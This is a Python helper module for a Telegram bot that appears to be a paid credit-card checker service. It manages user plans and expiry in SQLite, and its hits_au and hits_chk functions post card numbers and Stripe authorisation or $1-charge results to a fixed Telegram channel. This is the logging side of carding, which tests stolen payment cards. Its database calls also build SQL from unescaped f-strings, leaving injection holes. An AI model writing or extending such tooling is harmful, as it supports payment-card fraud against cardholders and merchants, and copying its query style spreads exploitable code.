import sqlite3
import random
import string
from datetime import date
from pyrogram import Client

def randgen(length=6):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=length))


def insert_reg_data(user_id, username, antispam_time, reg_at):
    import sqlite3
    conn = sqlite3.connect('plugins/xcc_db/users.db')
    db = conn.cursor()
    db.execute(f"INSERT INTO users VALUES ('{user_id}','{username}','FREE','N/A','N/A','100','30','{antispam_time}','0','{reg_at}')")
    conn.commit()
    conn.close()


def fetchinfo(user_id):
    conn = sqlite3.connect('plugins/xcc_db/users.db')
    db = conn.cursor()
    db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    info = db.fetchone()
    conn.commit()
    conn.close()
    return info


def getalldata(table_name):
    conn = sqlite3.connect('plugins/xcc_db/users.db')
    db = conn.cursor()
    db.execute(f"SELECT * FROM {table_name}")
    info = db.fetchall()
    conn.commit()
    conn.close()
    return info

def get_user_rank(user_id):
    # Dummy rank logic; customize it if you're using a database
    if str(user_id) == "6440962840":
        return "Owner"
    return "Premium"

def updatedata(user_id, module_name, value):
    conn = sqlite3.connect('plugins/xcc_db/users.db')
    c = conn.cursor()
    c.execute(f"UPDATE users SET {module_name} = ? WHERE user_id = ?", (value, user_id))
    conn.commit()
    conn.close()


async def plan_expirychk(user_id):
    try:
        today = str(date.today())
        plan_resp = fetchinfo(user_id)
        expiry = str(plan_resp[4])
        if expiry != 'N/A' and expiry < today:
            updatedata(user_id, "expiry", "N/A")
            updatedata(user_id, "plan", "N/A")
            resp = """
𝗛𝗲𝘆 𝗗𝘂𝗱𝗲
𝗬𝗼𝘂𝗿 𝗣𝗹𝗮𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗔𝗴𝗮𝗶𝗻 𝘂𝘀𝗶𝗻𝗴 /buy
            """
            await Client.send_message(user_id, resp)
    except Exception as e:
        print(e)


# Optional hit logs
async def send_mtc(resp):
    try:
        hits_id = "-1002046472570"
        await Client.send_message(hits_id, resp)
    except Exception as e:
        print(e)


async def hits_au(cc, result):
    try:
        hits_id = "-1002046472570"
        resp = f"""<b>
⊗ Card - <code>{cc}</code>
⊗ Response - {result}
⊗ GATEWAY - Stripe Auth
</b>"""
        await Client.send_message(hits_id, resp)
    except Exception as e:
        print(e)


async def hits_chk(cc, result, pi):
    try:
        hits_id = "-1002046472570"
        resp = f"""<b>
⊗ Card - <code>{cc}</code>
⊗ Response - {result}
⊗ GATEWAY - Stripe Charge 1$
⊗ SRC - <code>{pi}</code>
</b>"""
        await Client.send_message(hits_id, resp)
    except Exception as e:
        print(e)